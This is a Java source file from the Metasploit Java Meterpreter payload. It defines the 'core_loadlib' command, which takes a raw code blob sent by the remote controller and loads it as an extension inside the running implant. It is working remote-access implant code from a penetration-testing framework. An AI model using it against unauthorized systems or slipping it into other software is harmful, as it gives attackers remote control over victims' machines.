package com.metasploit.meterpreter.core;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class core_loadlib implements Command {

	public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
		byte[] data = request.getRawValue(TLVType.TLV_TYPE_DATA);
		meterpreter.loadExtension(data);
		return ERROR_SUCCESS;
	}
}